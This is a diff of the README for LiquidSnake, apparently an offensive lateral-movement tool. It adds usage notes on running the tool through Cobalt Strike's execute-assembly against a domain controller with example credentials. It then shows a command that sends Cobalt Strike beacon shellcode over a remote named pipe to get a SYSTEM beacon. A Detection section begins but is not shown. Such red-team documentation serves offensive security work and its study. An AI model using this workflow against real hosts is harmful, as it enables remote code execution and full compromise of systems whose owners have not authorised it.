@@ -51,6 +51,8 @@ LiquidSnake.exe dc01.isengard.local
 LiquidSnake.exe dc01.isengard.local saruman deahtoFrodo123 isengard.local
 ```
 
+NOTE: Currently thers is a bug when you explicitly set user credentials, the tool will not work in that case. It is recommended to use `make_token` or any other impersonation mechanism instead.
+
 If everything went fine, you should obtain an output similar as the following:
 
 ```
@@ -61,17 +63,29 @@ If everything went fine, you should obtain an output similar as the following:
 [*] Sleeping again... long day
 ```
 
+The example above uses CobaltStrike's `execute-assembly` to launch LiquidSnake:
+
+![](images/2021-08-31-16-42-30.png)
+
 Meanwhile, in the remote host a new named pipe will be created with the following name:
 
 ```
 \\.\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7
 ```
 
+![](images/2021-08-31-16-43-15.png)
+
 Then, using my `send_shellcode_via_pipe` [project from my BOFs](https://github.com/RiccardoAncarani/BOFs/tree/master/send_shellcode_via_pipe) you can send an arbitrary shellcode on the remote pipe that will be loaded and executed:
 
 ```
-send_shellcode_via_pipe \\.\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7 beacon.bin 
+send_shellcode_via_pipe \\dc01\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7 beacon.bin 
 ```
+
+![](images/2021-08-31-16-41-25.png)
+
+If everything worked as expected, you should obtain a SYSTEM beacon:
+
+![](images/2021-08-31-16-41-05.png)
 
 ## Detection
 
